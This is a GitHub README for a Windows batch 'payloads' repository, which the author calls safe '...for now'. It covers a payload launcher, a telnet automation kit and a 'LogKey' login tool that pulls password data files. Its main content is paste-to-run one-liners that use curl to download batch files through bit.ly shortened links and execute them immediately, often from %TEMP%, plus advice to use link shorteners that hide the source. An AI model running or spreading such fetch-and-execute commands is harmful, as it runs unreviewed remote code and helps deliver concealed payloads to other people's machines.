# Payloads
A collection of my custom safe (...for now hehe) payloads for Windows.<br>
Some payloads are for personal or educational use only and might not deliver the results you wanted.



## Batchfiles
Here are the individual batchfiles and instructions on how to use them.
> **Warning** <br>
> It is required to write the script into a file with different name **aside from r.bat** since r.bat is the default name that PLs.bat uses to name a payload it downloaded. If you want to use r.bat as the name of your manually downloaded payload, you may fork the repository and change the configuration variables inside PLs.bat.<br>
> For scripts that include `cd %temp% &` in the command, you may change **%temp%** to a different folder of your choice. Be sure to select a directory and make sure that the directory is accessible to avoid errors when running the script.



### PLs.bat
[**PLs**](https://github.com/Jed556/Payloads/blob/main/PLs.bat) is the boss. This is the main launcher and download manager for all payloads.<br>

#### Download and Run PLs.bat
You may add additional arguments to the end of the command. Please refer to the **Arguments** section for more information.
```Batch
cmd /c curl -Lo pls.bat bit.ly/PLs-bat & pls
```

#### Arguments
Without arguments, or with missing arguments, the script will prompt you for the payload to run and the arguments to pass to it. The following table provides examples of how to run the script with different arguments.
|Index|Example|Description|
|:---:|:-----:|:--------- |
|1|**pls 1**|Specifies the **index** of the payload to run (default: none).|
|2|**pls 2 1**|Enables (**1**) or disables (**0**) debug mode (default: 0). This option will be passed to the specified payload.|
|*|**pls 3 0 2**|Arguments starting from index 3 are passed to the specified payload. Check the argument list for the specific payload you want to run, and add 1 to the indexes to understand the indexing better.|



### TelKit
[**Telkit**](https://github.com/Jed556/Payloads/blob/main/Telkit/telkit.bat) is a custom payload for telnet run automations. <br>

#### Download and Run TelKit
You may add additional arguments to the end of the command. Please refer to the **Arguments** section for more information.
```Batch
cmd /c cd %temp% & curl -Lo tk.bat bit.ly/PLs-tk & tk
```

#### Arguments
When arguments are missing or not provided, the script will prompt you for the telnet service to connect to. Refer to the table below for sample commands that demonstrate how to run the script with different arguments.
|Index|Example|Description|
|:---:|:-----:|:--------- |
|1|**tk 0**|Enable (**1**) or disable (**0**) debug mode (default:0)|
|2|**tk 1 1**|Specifies the index of the telnet service to connect to (default: none).|



### LogKey
[**LogKey**](https://github.com/Jed556/Payloads/blob/main/Logkey/logkey.bat) is a custom payload for id login. <br>

**Download and Run LogKey**
You may add additional arguments to the end of the command. Please refer to the **Arguments** section for more information.
```Batch
cmd /c curl -Lo lk.bat bit.ly/PLs-lk & lk
```

#### Arguments
If some arguments are not supplied, the script will utilize the default values specified in the script configuration variables. The table below provides examples of how to run the script with different arguments.
|Index|Example|Description|
|:---:|:-----:|:--------- |
|1|**lk 1**|Enable (**1**) or disable (**0**) debug mode (default:0).|
|2|**lk 0 8**|Specifies the length of the id (default: 8).|
|3|**lk 0 8 data/database.txt**|Specifies the URL or PATH to get the data from (default: [This Repository](https://raw.githubusercontent.com/Jed556/Payloads/main/LogKey/data.logkey)).|
|4|**lk 0 8 data/database.txt passwords.txt**|Specifies the name of the data file (default: file name with extension from URL).|
|5|**lk 0 8 data/database.txt passwords.txt 1**|Enable (**1**) or disable (**0**) data preservation (default:0). This prevents from the data copied (**passwords.txt**) from being deleted after use|



> **Note** <br>
> You may add `cd %temp% &` between `cmd /c` and `curl` for the files without a specific **cd** command to download and run inside Windows **%TEMP%** (temporary) folder.<br>
> You may change the file name *(ex. ***pls.bat***)* to a different name of your choice. Be sure to change the name of the file in the command *(& ***pls***)* as well.<br>
> You can adjust the individual configuration variables inside each script to your liking. Be sure to enter the correct values for the variables to avoid errors when running the script.



## Shortcuts
You may use link shorteners to shorten the commands. Here are some great link shorteners that you may use:<br>
- **Bitly**: [bitly.com](https://bitly.com/)<br>
- **Tinyurl**: [tinyurl.com](https://tinyurl.com/)<br>
- **Rebrandly**: [rebrand.ly](https://rebrand.ly/)<br>
- **Is.gd**: [is.gd](https://is.gd/)<br>
> I recommend using [**Bitly**](https://bitly.com/) or [**Tinyurl**](https://tinyurl.com/) since they are the only ones that I have tested so far. <br>